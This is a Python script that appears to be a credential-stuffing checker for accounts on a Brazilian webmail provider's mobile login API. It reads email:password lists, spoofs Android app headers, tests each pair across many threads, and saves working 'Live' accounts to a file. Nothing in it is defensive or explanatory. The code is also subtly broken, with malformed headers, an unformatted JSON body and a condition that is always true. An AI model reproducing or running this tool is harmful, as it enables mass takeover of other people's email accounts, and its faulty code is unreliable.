import requests, utils, concurrent.futures, base64
from requests.structures import CaseInsensitiveDict

emaillist = "./accounts"
livelist = "./bol"

def check():
    account = utils.save.removeFirstLine(emaillist).strip()
    if account:
        [email, senha] =  account.split(':')
        senha = senha.encode('ascii')
        senha = base64.b64encode(senha)
        senha = senha.decode('ascii')
        url = "https://bmail1.api.uol.com.br/v1/user/login"
        
        headers = CaseInsensitiveDict()
        headers["'Host'"] = "'bmail1.api.uol.com.br',"
        headers["'X-Client-ID'"] = "'Android - 5.1.1',"
        headers["'X-App-Version'"] = "'1.4.6'"
        headers["'X-Device'"] = "'heroltektt'"
        headers["'X-Device-UID'"] = "'f4b52015b7371011'"
        headers["'content-type'"] = "'application/json; charset=UTF-8'"
        headers["'accept-encoding'"] = "'gzip'"
        headers["'user-agent'"] = "'okhttp/4.2.2'"
        headers["Content-Type"] = "application/json"
        
        data = '{"email": {email}, "password": {senha}}'
        
        resp = requests.post(url, headers=headers, data=data)
        
        print(resp.status_code)
        if '"{code:"' in resp.text:
            utils.colors.correct("Live")
            utils.save.savetofile(livelist, resp.json()["username"])
        elif "INVALID_USER_OR_PASSWORD" or "Not authenticated" in resp.text:
            utils.colors.error("Die")
        elif 'HTTPSConnectionPool' in resp.text:
            utils.colors.info("Proxy Error")
            utils.save.savetofile(emaillist, account)

if __name__ == "__main__":
    try:
        lista_len = utils.get_len(emaillist)
        utils.colors.correct(f"Loaded {lista_len}x items.")
        with concurrent.futures.ThreadPoolExecutor(max_workers=int(input("Threads: "))) as executor:
            [executor.submit(check) for i in range(0, lista_len, 1)]
    except KeyboardInterrupt:
        pass

input('Acabou.')